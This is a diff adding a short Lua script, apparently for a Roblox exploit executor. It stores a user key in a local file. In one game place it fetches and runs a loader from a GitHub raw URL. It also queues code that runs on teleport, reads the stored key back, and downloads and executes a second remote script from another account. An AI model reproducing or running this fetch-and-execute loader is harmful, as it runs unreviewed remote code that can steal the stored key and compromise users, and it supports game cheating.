@@ -1,0 +1,21 @@
+
+
+writefile("156a6e94a2ff424691da9222a39a4631", _G.Key)
+
+do
+    if game.PlaceId == 10228136016 then
+        local Loader = loadstring(game:HttpGet("https://raw.githubusercontent.com/lolsavvy/loader/main/loader",true))()
+        Loader:Initialize()
+        --load
+        queue_on_teleport([==[
+            if game.CreatorId == 1154360 and game.PlaceId ~= 10228136016 then
+                pcall(function()
+                    _G.Key = readfile("156a6e94a2ff424691da9222a39a4631")
+                    memorystats.cache("Gui")
+                    task.wait();
+                    loadstring(game:HttpGet("https://raw.githubusercontent.com/TridentBOY/cookiepopone/main/ploplop"))()
+                end)
+            end;
+        ]==])
+    end
+end
